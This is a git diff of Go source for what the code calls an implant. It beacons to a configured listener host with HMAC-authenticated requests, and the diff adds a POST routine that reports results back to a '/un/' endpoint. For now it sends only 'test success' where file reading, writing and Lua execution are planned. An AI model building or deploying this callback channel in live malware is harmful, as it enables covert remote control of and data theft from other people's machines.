@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -48,6 +49,34 @@ func makeGetRequest(baseUrl string, maxRetries int, params url.Values) (*http.Re
 	return nil, fmt.Errorf("failed to fetch URL after %d attempts: %w", maxRetries, err)
 }
 
+// makePostRequest makes a POST request to the given URL
+// It takes in 3 parameters
+// 1) The base URL to make the request to
+// 2) The params of the message
+// It returns the response and any error that occurred
+func makePostRequest(baseUrl string, params string) (*http.Response, error) {
+	reqURL, _ := url.Parse(baseUrl)
+	// Create the data payload
+	data := map[string]string{
+		"msg": params,
+	}
+
+	// Marshal the data to JSON
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		return nil, fmt.Errorf("error marshaling JSON: %v", err)
+	}
+
+	// Send the HTTP POST request
+	resp, err := http.Post(reqURL.String(), "application/json", bytes.NewBuffer(jsonData))
+
+	if err != nil {
+		return nil, fmt.Errorf("error sending POST request: %v", err)
+	}
+
+	return resp, nil
+}
+
 // The 4 byte ID for the implant to use set at compile time
 var CompUUID string
 
@@ -62,8 +91,9 @@ func main() {
 
 	for {
 		baseUrl := ""
-
 		baseUrl = "http://" + conf.Listener + "/auth/" + CompUUID
+		postUrl := ""
+		postUrl = "http://" + conf.Listener + "/un/" + CompUUID
 
 		token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)
 
@@ -139,6 +169,8 @@ func main() {
 			// Here is where command processing should occur
 			// A switch statement to run through possible command options, including using the lua engine
 			// List arbitrary dir, read file, write file, execute Lua
+			// Returns the result of execution (stdout or bool) or returns an error
+			makePostRequest(postUrl, "test success")
 			break
 		} else {
 			fmt.Println("HMAC is invalid or message was tampered with.")
